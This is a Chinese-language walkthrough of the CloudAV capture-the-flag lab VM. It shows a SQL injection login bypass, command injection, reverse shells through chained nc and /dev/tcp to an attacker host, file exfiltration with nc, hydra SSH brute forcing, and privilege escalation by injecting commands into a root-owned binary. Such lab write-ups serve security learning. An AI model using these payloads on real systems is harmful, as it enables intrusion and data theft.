# 打靶-CloudAV



<div class="has-toc have-toc">
</div>

## 0x00 描述

云反病毒扫描器！是一种基于云的防病毒扫描服务。

目前，它处于测试模式。您被要求测试设置并查找漏洞并升级权限。

难度：容易

涉及的任务：

  * 端口扫描
  * 网络应用程序攻击
  * sql注入
  * 命令注入
  * 蛮力
  * 代码分析

## 0x01 正式打靶

使用arping来进行主机发现，arping的适用性优于arp-scan，默认安装在linux系统中，arp-scan则是作为一种渗透测试的工具。缺点是无法对一段ip地址进行统一的主机发现，需要与shell脚本结合一下。使用`for i in $(seq 1 254);do sudo arping -c 2 10.0.2.$i;done`，-c：发送指定的count个ARP REQUEST包后停止。<figure class="wp-block-image size-full">

<img loading="lazy" width="1319" height="253" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-52.png" alt="" class="wp-image-4000" /> </figure> 

对主机进行端口扫描。<figure class="wp-block-image size-full">

<img loading="lazy" width="1738" height="825" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-53.png" alt="" class="wp-image-4001" /> </figure> 

访问web服务，这里有两种攻击思路，通过SQL注入绕过登录和暴力破解。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-54.png" alt="" class="wp-image-4002" width="608" height="285" /> </figure> 

使用bp的intruder进行fuzz测试，把键盘上所有的特殊符号作为字典，因为在任何的语言中，键盘上的符号都有特殊的功能，如果存在注入漏洞，当注入特殊符号的时候，就会触发服务器端代码上的问题，造成语法语义上的歧义，从而使服务器无法处理请求，从而发现漏洞，通过触发漏洞，可以找到可能存在的注入漏洞。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-55.png" alt="" class="wp-image-4004" width="524" height="99" /> </figure> 

返回200代表返回的是错误的信息，而双引号是触发了sqlite的报错。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-56.png" alt="" class="wp-image-4005" width="536" height="460" /> </figure> 

接着往下看，发现密码是SQL语句拼接的。<figure class="wp-block-image size-full">

<img loading="lazy" width="1080" height="380" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-57.png" alt="" class="wp-image-4006" /> </figure> 

构造payload为`" or 1=1 --`，这样整个sql语句就是`select * from code where password="" or 1=1 --"`，Redirecting to /scan<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-58.png" alt="" class="wp-image-4007" width="521" height="317" /> </figure> 

这里可以指定文件名提交给服务器进行云查杀，这里可以猜想，当我们提交某个文件之后，服务器也是会调用某个命令进行操作，比如：avscan hello，那就意味着能够进行命令执行。测试一下`hello|ls`（这里一直出不了结果，后来发现靶机比较玄学，太搞心态了。。。，吃完饭回来发现才ok了）<figure class="wp-block-image size-full">

<img loading="lazy" width="841" height="199" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-59.png" alt="" class="wp-image-4009" /> </figure> 

在Linux上通常会使用nc进行网络连接，来查看一下nc命令是否存在：`hello | which nc`，返回结果为`/bin/nc`，构造`nc -e /bin/sh 10.0.2.4 2333`来反弹shell，-e prog 程序重定向，一旦连接，就执行。但是侦听端口并没有返回信息，这里怀疑靶机linux发行版的nc不支持-e这个参数。下面使用nc的串联，这样，连接2333后，在2333输入的指令，都会通过管道符在/bin/bash下解析，再把执行的结果返回到8888端口。

<pre class="wp-block-code"><code>hello| nc 10.0.2.4 2333 | /bin/bash | nc 10.0.2.4 8888</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="1902" height="279" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-60.png" alt="" class="wp-image-4010" /> </figure> 

发现可疑文件database.sql，应该是Web应用程序的数据库，执行file命令。<figure class="wp-block-image size-full">

<img loading="lazy" width="1416" height="41" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-61.png" alt="" class="wp-image-4011" /> </figure> 

用nc命令把文件下载下来进行查看。

<pre class="wp-block-code"><code>本地：nc -nvlp 9999 > db.sql

靶机：nc 10.0.2.4 9999 &lt; database.sql</code></pre>

发现存储有密码信息。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-67.png" alt="" class="wp-image-4019" width="562" height="441" /> </figure> 

再利用`cat /etc/passwd | grep /bin/bash`找出有shell权限的用户，构造用户名和密码的字典，然后使用hydra对ssh进行爆破。`hydra -L user.txt -P pass.txt ssh://10.0.2.6`，结果失败了。

再次进行信息搜集，在上级目录下发现可疑文件，属主是root，看名字应该是进行avscan的。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-64.png" alt="" class="wp-image-4016" width="501" height="67" /> </figure> 

C语言文件应该就是源码，这里查看一下。<figure class="wp-block-image size-full">

<img loading="lazy" width="1744" height="644" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-65.png" alt="" class="wp-image-4017" /> </figure> 

这里可以构造参数拼接反弹shell的命令进去

<pre class="wp-block-code"><code>./update_cloudav "a | nc 10.0.2.4 1111 | /bin/bash | nc 10.0.2.4 2222"</code></pre>

还有更简单的方法，参照<a rel="noreferrer noopener" href="http://www.maidang.cool/2021/54528.html" target="_blank" rel="nofollow" >http://www.maidang.cool/2021/54528.html</a>。

<pre class="wp-block-code"><code>./update_cloudav "a;echo 'bash -i >& /dev/tcp/10.0.2.4/5555 0>&1' | bash"</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="1257" height="323" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-66.png" alt="" class="wp-image-4018" /> </figure>
